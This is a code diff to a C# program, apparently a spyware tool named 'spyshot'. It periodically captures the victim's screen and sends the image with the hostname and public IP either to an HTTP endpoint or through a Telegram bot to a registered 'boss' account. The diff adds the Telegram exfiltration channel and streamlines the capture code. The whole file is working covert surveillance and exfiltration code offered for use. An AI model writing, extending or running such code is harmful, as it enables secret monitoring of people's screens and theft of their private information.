@@ -1,25 +1,31 @@
 ﻿using System;
-using System.Drawing;
-using System.Drawing.Imaging;
 using System.IO;
 using System.Linq;
 using System.Net;
 using System.Net.Http;
 using System.Net.NetworkInformation;
-using System.Runtime.InteropServices;
 using System.Text;
 using System.Text.Json;
 using System.Threading.Tasks;
 using System.Timers;
+using spyshot;
+using Telegram.Bot;
+using Telegram.Bot.Types;
+using Telegram.Bot.Types.Enums;
 
 
 internal class Program
 {
+    static ITelegramBotClient botClient;
+    static long? chatId = default;
     private static void Main(string[] args)
     {
+        // args = new string[] { "--bot-token=<>", "--admin-username=<>" };
 #if WINDOWS
 
         var input = GetInputFromArgs(args);
+
+        ConfigureBot(input.BotToken, input.AdminUsername);
     
         Timer timer = new() { Interval = input.Interval };
         timer.Elapsed += async (a, b) => await Task.Run(async () => 
@@ -32,32 +38,14 @@ internal class Program
             {
                 try 
                 {
-                    var ip = await GetIpOrDefaultAsync();
-                    Rectangle screenBounds = GetPrimaryScreenBounds();
-                    using Bitmap screenshot = new(screenBounds.Width, screenBounds.Height);
+                    byte[] imageBytes = Screen.GetScreenshot();
 
-                    using var graphics = Graphics.FromImage(screenshot);
-                    graphics.CopyFromScreen(screenBounds.Location, Point.Empty, screenBounds.Size);
+                    if(false == string.IsNullOrWhiteSpace(input.Destination))
+                        await SendToDriveAsync(input.Destination, imageBytes);
 
-                    using var ms = new MemoryStream();
-                    screenshot.Save(ms, ImageFormat.Png);
-                    byte[] imageBytes = ms.ToArray();
-                    var base64Image = Convert.ToBase64String(imageBytes);
-
-                    string hostName = Dns.GetHostName();
-
-                    var payload = new StringContent(JsonSerializer.Serialize(new
-                    {
-                        image = base64Image,
-                        hostName,
-                        ip
-                    }));
+                    if(false == string.IsNullOrWhiteSpace(input.BotToken))
+                        await SendToBotAsync(imageBytes);
                     
-                    using var client = new HttpClient();
-                    byte[] payloadBytes = Encoding.UTF8.GetBytes(base64Image);
-                    string url = input.Destination;
-                    HttpResponseMessage response = await client.PostAsync(url, payload);
-                    Console.WriteLine($"Response: {response.StatusCode}, {await response.Content.ReadAsStringAsync()}");
                 }
                 catch(Exception ex)
                 {
@@ -65,21 +53,113 @@ internal class Program
                 }
             }
         });
+
         timer.Start();
 
         while(true);
 #endif
     }
 
-    static (int Interval, string Destination) GetInputFromArgs(string[] args)
+    private static async Task SendToBotAsync(byte[] imageBytes)
     {
-        var destinationUrl = args.FirstOrDefault(a => a.StartsWith("--destination=")) 
-            ?? throw new Exception("You must provide a destination url with --destination option");
+        if(chatId.HasValue)
+        {
+            using var stream = new MemoryStream(imageBytes);
+            await botClient.SendPhotoAsync(
+                chatId:chatId,
+                photo: InputFile.FromStream(stream),
+                caption: Dns.GetHostName());
+        }
+        else 
+        {
+            Console.WriteLine("Admin should write to bot first in order to create a chatrooom.");
+        }
+    }
+
+    private static async Task SendToDriveAsync(string destination, byte[] imageBytes)
+    {
+        var base64Image = Convert.ToBase64String(imageBytes);
+        string hostName = Dns.GetHostName();
+
+        var payload = new StringContent(JsonSerializer.Serialize(new
+        {
+            image = base64Image,
+            hostName,
+            ip = await GetIpOrDefaultAsync()
+        }));
+        
+        using var client = new HttpClient();
+        byte[] payloadBytes = Encoding.UTF8.GetBytes(base64Image);
+        HttpResponseMessage response = await client.PostAsync(destination, payload);
+        Console.WriteLine($"Response: {response.StatusCode}, {await response.Content.ReadAsStringAsync()}");
+    }
+
+    private static void ConfigureBot(string botToken, string adminUsername)
+    {
+        if(!string.IsNullOrWhiteSpace(botToken))
+        {
+            botClient = new TelegramBotClient(botToken);
+
+            botClient.StartReceiving(
+                async (client, update, token) => 
+                {
+                    if(update.Type == UpdateType.Message)
+                    {
+                        var username = update.Message.From.Username;
+                        var adminChatId = update.Message.Chat.Id;
+
+                        if(string.Equals(adminUsername, username, StringComparison.InvariantCultureIgnoreCase))
+                        {
+                            chatId = adminChatId;
+                            await client.SendTextMessageAsync(
+                                adminChatId,
+                                "Sizni ro'yxatga oldik, boss 🫡",
+                                cancellationToken: token);
+                        }
+                        else 
+                        {
+                            await client.SendTextMessageAsync(
+                                adminChatId,
+                                "NO ✋",
+                                cancellationToken: token);
+                        }
+                    }
+                },
+                (client, exception, token) =>
+                {
+                    Console.WriteLine(exception.Message);
+                },
+                new()
+                {
+                    AllowedUpdates = new UpdateType[] { UpdateType.Message }
+                });
+        }
+
+        
+    }   
+
+    static (int Interval, string Destination, string BotToken, string AdminUsername) GetInputFromArgs(string[] args)
+    {
+        var destinationUrl = args.FirstOrDefault(a => a.StartsWith("--destination="));
 
         var intervalString = args.FirstOrDefault(a => a.StartsWith("--interval="));
-        int.TryParse(intervalString.Replace("--interval=", ""), out int interval);
+        int.TryParse(intervalString?.Replace("--interval=", "") ?? "10", out int interval);
 
-        return (interval > 0 ? interval * 1000 : 3600 * 1000, destinationUrl.Replace("--destination=", ""));
+        var botToken = args.FirstOrDefault(a => a.StartsWith("--bot-token="));
+        var adminUsername = args.FirstOrDefault(a => a.StartsWith("--admin-username="));
+
+        if(string.IsNullOrWhiteSpace(destinationUrl) && string.IsNullOrWhiteSpace(botToken))
+            throw new Exception("You must specify either --destination= or --bot-token=");
+
+        if(!string.IsNullOrWhiteSpace(botToken) && string.IsNullOrWhiteSpace(adminUsername))
+            throw new Exception("You must specify --admin-username= when you specify --bot-token=");
+
+        return (
+            interval > 0 ? interval * 1000 : 3600 * 1000, 
+            destinationUrl?.Replace("--destination=", ""), 
+            botToken?.Replace("--bot-token=", ""),
+            adminUsername?.Replace("--admin-username=", "")
+        );
     }
 
     static async Task<string> GetIpOrDefaultAsync()
@@ -91,44 +171,4 @@ internal class Program
 
         return default;
     }
-
-    [DllImport("user32.dll")]
-    static extern IntPtr GetDesktopWindow();
-
-    [DllImport("user32.dll")]
-    static extern IntPtr GetDC(IntPtr hWnd);
-
-    [DllImport("user32.dll")]
-    static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);
-
-    [DllImport("user32.dll")]
-    static extern int GetSystemMetrics(int nIndex);
-
-    [DllImport("user32.dll")]
-    static extern int GetClientRect(IntPtr hWnd, out RECT lpRect);
-
-    public const int SM_CXSCREEN = 0;
-    public const int SM_CYSCREEN = 1;
-
-    static Rectangle GetPrimaryScreenBounds()
-    {
-        IntPtr desktopWindow = GetDesktopWindow();
-        IntPtr hdc = GetDC(desktopWindow);
-
-        int screenWidth = GetSystemMetrics(SM_CXSCREEN);
-        int screenHeight = GetSystemMetrics(SM_CYSCREEN);
-
-        ReleaseDC(desktopWindow, hdc);
-
-        return new Rectangle(0, 0, screenWidth, screenHeight);
-    }
-}
-
-[StructLayout(LayoutKind.Sequential)]
-public struct RECT
-{
-    public int Left;
-    public int Top;
-    public int Right;
-    public int Bottom;
 }
